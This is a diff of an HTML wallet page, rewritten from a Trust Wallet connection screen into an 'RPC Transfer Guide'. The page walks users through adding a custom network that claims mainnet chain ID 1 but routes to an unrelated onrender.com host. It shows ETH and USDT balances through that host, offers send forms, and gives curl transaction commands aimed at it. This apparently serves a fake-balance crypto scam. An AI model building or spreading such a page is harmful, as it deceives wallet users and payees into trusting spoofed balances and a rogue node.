@@ -3,243 +3,314 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connect Trust Wallet</title>
+    <title>RPC Transfer Guide</title>
     <style>
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin: 0;
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 40px auto;
             padding: 20px;
-            color: white;
-            text-align: center;
-        }
-        .container {
-            max-width: 450px;
-            background: rgba(255,255,255,0.1);
-            backdrop-filter: blur(10px);
-            border-radius: 30px;
-            padding: 30px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-        }
-        h1 { font-size: 28px; margin-bottom: 10px; }
-        p { font-size: 16px; line-height: 1.5; opacity: 0.9; }
-        .button {
-            display: block;
-            background: white;
+            background: #f5f7fa;
             color: #333;
-            padding: 15px 20px;
-            border-radius: 30px;
-            font-size: 18px;
-            font-weight: 600;
-            text-decoration: none;
-            margin: 15px 0;
+        }
+        h1, h2 {
+            color: #2c3e50;
+        }
+        .card {
+            background: white;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        .info {
+            background: #e3f2fd;
+            padding: 10px;
+            border-radius: 5px;
+            margin: 10px 0;
+            word-break: break-all;
+        }
+        input, button {
+            padding: 10px;
+            margin: 5px 0;
             width: 100%;
             box-sizing: border-box;
-            border: none;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            background: #3b99fc;
+            color: white;
+            font-weight: bold;
             cursor: pointer;
-            transition: background 0.3s;
+            border: none;
         }
-        .button:hover { background: #f0f0f0; }
-        .button:disabled { background: #ccc; cursor: not-allowed; }
-        .error {
-            background: rgba(255,0,0,0.2);
-            padding: 10px;
-            border-radius: 10px;
-            margin: 15px 0;
-            color: #ffcccb;
+        button:hover {
+            background: #2a7ac4;
         }
-        .success {
-            background: rgba(0,255,0,0.2);
-            padding: 10px;
-            border-radius: 10px;
-            margin: 15px 0;
-            color: #ccffcc;
+        button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
         }
-        #loading { display: none; margin: 10px 0; }
-        #qr-container {
-            display: none;
-            margin-top: 20px;
-            padding: 20px;
-            background: white;
-            border-radius: 20px;
-            color: #333;
-        }
-        #qr-code canvas, #qr-code img {
-            width: 200px;
-            height: 200px;
-            margin: 10px auto;
-        }
-        .uri-display {
-            background: #f0f0f0;
-            padding: 10px;
-            border-radius: 8px;
-            font-size: 12px;
-            word-break: break-all;
+        .balance {
+            font-size: 1.2em;
             margin: 10px 0;
         }
-        .manual-step {
-            text-align: left;
-            background: rgba(255,255,255,0.05);
-            border-radius: 15px;
+        .error {
+            color: #c62828;
+            background: #ffebee;
+            padding: 10px;
+            border-radius: 5px;
+        }
+        .success {
+            color: #2e7d32;
+            background: #e8f5e9;
+            padding: 10px;
+            border-radius: 5px;
+        }
+        .step {
+            background: #fff3e0;
             padding: 15px;
-            margin-top: 20px;
+            border-radius: 5px;
+            margin: 10px 0;
         }
     </style>
-    <!-- Try multiple CDNs for WalletConnect -->
-    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/dist/index.umd.min.js"></script>
-    <script src="https://unpkg.com/@walletconnect/ethereum-provider@2.11.0/dist/index.umd.min.js"></script>
-    <script src="https://esm.sh/@walletconnect/ethereum-provider@2.11.0?target=es2020"></script>
-    <!-- QR Code library (always needed) -->
-    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
-    <script>
-        // Library loaded flag
-        window.wcLoaded = false;
-        window.qrLoaded = false;
-
-        function checkLibraries() {
-            if (typeof window.EthereumProvider !== 'undefined') {
-                window.wcLoaded = true;
-                console.log('✅ WalletConnect library loaded');
-            }
-            if (typeof window.QRCode !== 'undefined') {
-                window.qrLoaded = true;
-                console.log('✅ QRCode library loaded');
-            }
-            if (!window.wcLoaded) {
-                document.getElementById('errorMsg').innerHTML = '❌ WalletConnect library failed to load. Please check your internet or use the manual options below.';
-                document.getElementById('connectBtn').disabled = true;
-                document.getElementById('retryBtn').style.display = 'block';
-            } else {
-                document.getElementById('connectBtn').disabled = false;
-            }
-            if (!window.qrLoaded) {
-                document.getElementById('errorMsg').innerHTML += '<br>⚠️ QR library also failed – some features may not work.';
-            }
-        }
-        setTimeout(checkLibraries, 3000);
-    </script>
+    <!-- Ethers.js -->
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 </head>
 <body>
-    <div class="container">
-        <h1>🔗 Connect Trust Wallet</h1>
-        <p>Use the button below to instantly connect to:</p>
-        <p style="font-size:14px; word-break:break-all;">https://express-shipping-mcu1.onrender.com</p>
-        <p><small>Chain ID: 1 | Symbol: ETH</small></p>
+    <h1>🚀 RPC Transfer Guide</h1>
+    <p>Use this page to send ETH or USDT on your custom RPC network.</p>
 
-        <button class="button" id="connectBtn" onclick="connectWallet()">Connect Now</button>
-        <button class="button" id="retryBtn" style="display:none; background:#ffc107;" onclick="retryLoad()">Retry Loading Library</button>
-        <div id="loading">⏳ Generating connection request...</div>
-        <div id="errorMsg" class="error"></div>
-
-        <!-- QR code container (fallback) -->
-        <div id="qr-container">
-            <h3>📱 Scan with Trust Wallet</h3>
-            <div id="qr-code"></div>
-            <div class="uri-display" id="wc-uri"></div>
-            <button class="button" onclick="copyURI()" style="background:#6c5ce7;">Copy Link</button>
+    <div class="card">
+        <h2>📡 Network Details</h2>
+        <div class="info">
+            <strong>RPC URL:</strong> https://express-shipping-mcu1.onrender.com<br>
+            <strong>Chain ID:</strong> 1<br>
+            <strong>Symbol:</strong> ETH<br>
+            <strong>USDT Contract:</strong> 0xdac17f958d2ee523a2206206994597c13d831ec7
         </div>
+        <p><em>Make sure your wallet is connected to this network. If not, follow the steps below.</em></p>
+    </div>
 
-        <!-- Manual network addition instructions -->
-        <div class="manual-step">
-            <h3>📲 Manual Setup</h3>
-            <p>If automatic connection fails, add the network manually in Trust Wallet:</p>
-            <ol style="text-align:left; font-size:14px;">
-                <li>Open Trust Wallet → Settings → Networks → Add Network</li>
-                <li><strong>Network Name:</strong> Custom RPC</li>
-                <li><strong>RPC URL:</strong> https://express-shipping-mcu1.onrender.com</li>
-                <li><strong>Chain ID:</strong> 1</li>
-                <li><strong>Symbol:</strong> ETH</li>
-                <li>Save and switch to this network</li>
-                <li>Then use the "Connect Now" button again (after adding)</li>
-            </ol>
+    <div class="card">
+        <h2>🔌 Connect Wallet</h2>
+        <button id="connectBtn">Connect MetaMask / Wallet</button>
+        <div id="accountInfo" class="info" style="display:none;"></div>
+        <div id="balanceInfo" class="balance" style="display:none;"></div>
+    </div>
+
+    <div class="card" id="sendEthCard" style="display:none;">
+        <h2>💰 Send ETH</h2>
+        <input type="text" id="ethTo" placeholder="Recipient address (0x...)" />
+        <input type="text" id="ethAmount" placeholder="Amount in ETH (e.g., 0.01)" />
+        <button id="sendEthBtn">Send ETH</button>
+        <div id="ethResult"></div>
+    </div>
+
+    <div class="card" id="sendUsdtCard" style="display:none;">
+        <h2>💵 Send USDT</h2>
+        <input type="text" id="usdtTo" placeholder="Recipient address (0x...)" />
+        <input type="text" id="usdtAmount" placeholder="Amount in USDT (e.g., 200)" />
+        <button id="sendUsdtBtn">Send USDT</button>
+        <div id="usdtResult"></div>
+    </div>
+
+    <div class="card">
+        <h2>📋 Manual Setup Guide</h2>
+        <div class="step">
+            <strong>Step 1:</strong> Add the custom network to your wallet<br>
+            <code>Network Name: Custom RPC<br>
+            RPC URL: https://express-shipping-mcu1.onrender.com<br>
+            Chain ID: 1<br>
+            Symbol: ETH</code>
+        </div>
+        <div class="step">
+            <strong>Step 2:</strong> Import the USDT token (optional)<br>
+            <code>Contract Address: 0xdac17f958d2ee523a2206206994597c13d831ec7<br>
+            Symbol: USDT<br>
+            Decimals: 6</code>
+        </div>
+        <div class="step">
+            <strong>Step 3:</strong> Use the "Connect Wallet" button above and then send transactions.
+        </div>
+        <div class="step">
+            <strong>Alternative – curl commands:</strong><br>
+            <strong>Send ETH:</strong><br>
+            <code>curl -X POST https://express-shipping-mcu1.onrender.com -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"eth_sendTransaction","params":[{"from":"YOUR_ADDRESS","to":"RECIPIENT","value":"0xde0b6b3a7640000"}],"id":1}'</code><br>
+            <strong>Send USDT:</strong><br>
+            <code>curl -X POST https://express-shipping-mcu1.onrender.com -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"eth_sendTransaction","params":[{"from":"YOUR_ADDRESS","to":"0xdac17f958d2ee523a2206206994597c13d831ec7","data":"0xa9059cbb000000000000000000000000RECIPIENT_ADDRESS_PADDED_32_BYTES000000000000000000000000000000000000000000000000000000000bebc200"}],"id":1}'</code>
         </div>
     </div>
 
     <script>
-        const PROJECT_ID = "cd1a5ec0393767579e1f364ffc41597d";
         const RPC_URL = "https://express-shipping-mcu1.onrender.com";
+        const USDT_ADDRESS = "0xdac17f958d2ee523a2206206994597c13d831ec7";
+        const CHAIN_ID = 1; // hex 0x1
+
+        let provider, signer, userAddress;
+
+        document.getElementById('connectBtn').addEventListener('click', connectWallet);
 
         async function connectWallet() {
-            if (!window.wcLoaded) {
-                document.getElementById('errorMsg').innerText = 'Library still loading. Please wait a few seconds and try again.';
+            if (typeof window.ethereum === 'undefined') {
+                alert('No wallet detected. Please install MetaMask or another Web3 wallet.');
                 return;
             }
 
-            const btn = document.getElementById('connectBtn');
-            const loading = document.getElementById('loading');
-            const errorDiv = document.getElementById('errorMsg');
-            btn.disabled = true;
-            btn.textContent = 'Connecting...';
-            loading.style.display = 'block';
-            errorDiv.innerHTML = '';
-
             try {
-                // Initialize provider
-                const provider = await window.EthereumProvider.init({
-                    projectId: PROJECT_ID,
-                    chains: [1],
-                    showQrModal: false,
-                    rpcMap: { 1: RPC_URL },
-                    methods: ['eth_sendTransaction', 'eth_sign'],
-                    metadata: {
-                        name: 'RPC Connect',
-                        description: 'Connect to custom RPC',
-                        url: window.location.href,
-                        icons: []
+                // Request account access
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
+
+                // Create ethers provider using the injected provider
+                provider = new ethers.providers.Web3Provider(window.ethereum);
+                signer = provider.getSigner();
+                userAddress = await signer.getAddress();
+
+                // Check network and prompt to switch if needed
+                const network = await provider.getNetwork();
+                if (network.chainId !== CHAIN_ID) {
+                    try {
+                        await window.ethereum.request({
+                            method: 'wallet_switchEthereumChain',
+                            params: [{ chainId: '0x1' }] // 0x1 is hex for 1
+                        });
+                    } catch (switchError) {
+                        if (switchError.code === 4902) {
+                            await window.ethereum.request({
+                                method: 'wallet_addEthereumChain',
+                                params: [{
+                                    chainId: '0x1',
+                                    chainName: 'Custom RPC',
+                                    nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
+                                    rpcUrls: [RPC_URL]
+                                }]
+                            });
+                        } else {
+                            throw switchError;
+                        }
                     }
-                });
-
-                // Get URI
-                const uri = await new Promise((resolve) => {
-                    provider.once('display_uri', resolve);
-                    provider.connect().catch(() => {});
-                });
-
-                // Try deep link
-                const trustLink = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
-                window.location.href = trustLink;
-
-                // Also show QR in case deep link fails
-                if (window.qrLoaded) {
-                    document.getElementById('qr-container').style.display = 'block';
-                    document.getElementById('wc-uri').innerText = uri;
-                    QRCode.toCanvas(document.getElementById('qr-code'), uri, { width: 200 }, (err) => {
-                        if (err) console.error(err);
-                    });
                 }
 
-                // Fallback message
-                setTimeout(() => {
-                    if (!document.hidden) {
-                        errorDiv.innerHTML = '⚠️ Trust Wallet did not open automatically. Use the QR code above or try manual setup.';
+                document.getElementById('accountInfo').style.display = 'block';
+                document.getElementById('accountInfo').innerText = `Connected: ${userAddress}`;
+                document.getElementById('sendEthCard').style.display = 'block';
+                document.getElementById('sendUsdtCard').style.display = 'block';
+                document.getElementById('connectBtn').disabled = true;
+
+                // Update balances
+                await updateBalances();
+
+                // Listen for account/chain changes
+                window.ethereum.on('accountsChanged', (accounts) => {
+                    if (accounts.length === 0) {
+                        window.location.reload();
+                    } else {
+                        userAddress = accounts[0];
+                        document.getElementById('accountInfo').innerText = `Connected: ${userAddress}`;
+                        updateBalances();
                     }
-                }, 2000);
+                });
+                window.ethereum.on('chainChanged', () => window.location.reload());
 
             } catch (error) {
                 console.error(error);
-                errorDiv.innerHTML = '❌ Connection error: ' + error.message;
-                btn.disabled = false;
-                btn.textContent = 'Try Again';
-                loading.style.display = 'none';
+                alert('Connection failed: ' + error.message);
             }
         }
 
-        function retryLoad() {
-            location.reload();
+        async function updateBalances() {
+            if (!provider || !userAddress) return;
+            try {
+                // ETH balance
+                const ethBalance = await provider.getBalance(userAddress);
+                document.getElementById('balanceInfo').style.display = 'block';
+                document.getElementById('balanceInfo').innerHTML = `
+                    <strong>ETH Balance:</strong> ${ethers.utils.formatEther(ethBalance)} ETH<br>
+                `;
+
+                // USDT balance
+                const usdtContract = new ethers.Contract(USDT_ADDRESS, [
+                    "function balanceOf(address) view returns (uint256)",
+                    "function decimals() view returns (uint8)",
+                    "function symbol() view returns (string)"
+                ], provider);
+                const usdtBalance = await usdtContract.balanceOf(userAddress);
+                const decimals = await usdtContract.decimals();
+                const symbol = await usdtContract.symbol();
+                const formatted = ethers.utils.formatUnits(usdtBalance, decimals);
+                document.getElementById('balanceInfo').innerHTML += `
+                    <strong>${symbol} Balance:</strong> ${parseFloat(formatted).toLocaleString()} ${symbol}
+                `;
+            } catch (e) {
+                console.error('Balance update error:', e);
+            }
         }
 
-        function copyURI() {
-            const uri = document.getElementById('wc-uri').innerText;
-            if (uri) {
-                navigator.clipboard.writeText(uri).then(() => {
-                    alert('URI copied! You can paste it in Trust Wallet manually.');
+        // Send ETH
+        document.getElementById('sendEthBtn').addEventListener('click', async () => {
+            const to = document.getElementById('ethTo').value.trim();
+            const amount = document.getElementById('ethAmount').value.trim();
+            const resultDiv = document.getElementById('ethResult');
+
+            if (!to || !amount) {
+                resultDiv.innerHTML = '<span class="error">Please fill both fields</span>';
+                return;
+            }
+            if (!ethers.utils.isAddress(to)) {
+                resultDiv.innerHTML = '<span class="error">Invalid address</span>';
+                return;
+            }
+
+            try {
+                resultDiv.innerHTML = '<span>Sending...</span>';
+                const tx = await signer.sendTransaction({
+                    to: to,
+                    value: ethers.utils.parseEther(amount)
                 });
+                resultDiv.innerHTML = `<span class="success">Transaction sent! Hash: ${tx.hash}</span>`;
+                await tx.wait();
+                resultDiv.innerHTML += `<br><span class="success">Confirmed!</span>`;
+                await updateBalances();
+            } catch (err) {
+                resultDiv.innerHTML = `<span class="error">Error: ${err.message}</span>`;
             }
-        }
+        });
+
+        // Send USDT
+        document.getElementById('sendUsdtBtn').addEventListener('click', async () => {
+            const to = document.getElementById('usdtTo').value.trim();
+            const amount = document.getElementById('usdtAmount').value.trim();
+            const resultDiv = document.getElementById('usdtResult');
+
+            if (!to || !amount) {
+                resultDiv.innerHTML = '<span class="error">Please fill both fields</span>';
+                return;
+            }
+            if (!ethers.utils.isAddress(to)) {
+                resultDiv.innerHTML = '<span class="error">Invalid address</span>';
+                return;
+            }
+
+            try {
+                resultDiv.innerHTML = '<span>Sending...</span>';
+                const usdtContract = new ethers.Contract(USDT_ADDRESS, [
+                    "function transfer(address to, uint256 amount) returns (bool)",
+                    "function decimals() view returns (uint8)"
+                ], signer);
+
+                const decimals = 6; // USDT has 6 decimals
+                const amountParsed = ethers.utils.parseUnits(amount, decimals);
+
+                const tx = await usdtContract.transfer(to, amountParsed);
+                resultDiv.innerHTML = `<span class="success">Transaction sent! Hash: ${tx.hash}</span>`;
+                await tx.wait();
+                resultDiv.innerHTML += `<br><span class="success">Confirmed!</span>`;
+                await updateBalances();
+            } catch (err) {
+                resultDiv.innerHTML = `<span class="error">Error: ${err.message}</span>`;
+            }
+        });
     </script>
 </body>
 </html>
